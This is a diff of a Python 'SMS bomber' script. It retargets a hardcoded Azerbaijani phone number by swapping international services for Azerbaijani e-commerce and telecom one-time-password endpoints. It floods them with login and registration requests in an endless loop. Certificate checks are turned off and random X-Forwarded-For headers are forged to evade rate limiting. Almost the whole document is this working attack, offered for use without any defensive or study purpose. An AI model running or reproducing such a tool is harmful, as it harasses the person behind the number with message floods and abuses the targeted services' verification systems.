@@ -6,41 +6,46 @@ import ssl
 
 TARGET_PHONE = "994508880067" # Səlahiyyətli hədəf
 
-def storm():
-    print(f"[!!!] GLOBAL-CATACLYSM START: {TARGET_PHONE}")
+def final_storm():
+    print(f"[!!!] LOCAL-STORM START: {TARGET_PHONE}")
     
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
 
-    # Beynəlxalq və Azərbaycan nömrələrinə dözümlü SMS qapıları
+    # Azərbaycanda aktiv və 2026-cı ildə işləyən dözümsüz API-lər
     API_LIST = [
-        {"name": "Uber", "url": "https://auth.uber.com/api/v1/auth/otp", "data": {"mobile": "+" + TARGET_PHONE}},
-        {"name": "Wolt", "url": "https://wolt.com/api/v2/sessions/login", "data": {"mobile": "+" + TARGET_PHONE}},
-        {"name": "Tinder", "url": "https://api.gotinder.com/v2/auth/sms/send", "data": {"phone_number": "+" + TARGET_PHONE}},
-        {"name": "Glovo", "url": "https://glovoapp.com/api/v3/auth/otp", "data": {"phone": "+" + TARGET_PHONE}},
-        {"name": "Indriver", "url": "https://indriver.com/api/v1/auth/sms", "data": {"phone": TARGET_PHONE}}
+        {"name": "Umico", "url": "https://api.umico.az/api/v1/login/otp", "data": {"user_identifier": TARGET_PHONE, "type": "login"}},
+        {"name": "BakuElectronics", "url": "https://bakuelectronics.az/api/otp/send", "data": {"phone": TARGET_PHONE, "type": "registration"}},
+        {"name": "Kontakt", "url": "https://kontakt.az/wp-json/contact-api/v1/send-otp", "data": {"number": TARGET_PHONE[-9:], "type": "login"}},
+        {"name": "AliPasha", "url": "https://api.alipasha.az/api/v1/otp/send", "data": {"phone": TARGET_PHONE}},
+        {"name": "Vois", "url": "https://api.vois.az/api/v1/otp/send", "data": {"phone": TARGET_PHONE}}
     ]
 
     while True:
         for api in API_LIST:
             try:
                 headers = {
-                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
+                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
                     "Content-Type": "application/json",
+                    "Accept": "application/json",
                     "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                 }
                 
                 req = urllib.request.Request(api["url"], data=json.dumps(api["data"]).encode(), headers=headers, method='POST')
                 
                 with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
-                    print(f"[*] {api['name']} -> Status: {resp.getcode()} (Sent)")
+                    code = resp.getcode()
+                    print(f"[*] {api['name']} -> SUCCESS (Status: {code})")
                 
-                time.sleep(random.uniform(0.5, 2)) # Sürətli ardıcıllıq
+                time.sleep(2) # Hər servisi ard-arda yormamaq üçün
 
             except Exception as e:
-                # print(f"[!] {api['name']} skip")
+                # print(f"[MISS] {api['name']}")
                 pass
+        
+        print("--- Bir dalğa bitdi, 3 saniyə fasilə ---")
+        time.sleep(3)
 
 if __name__ == "__main__":
-    storm()
+    final_storm()
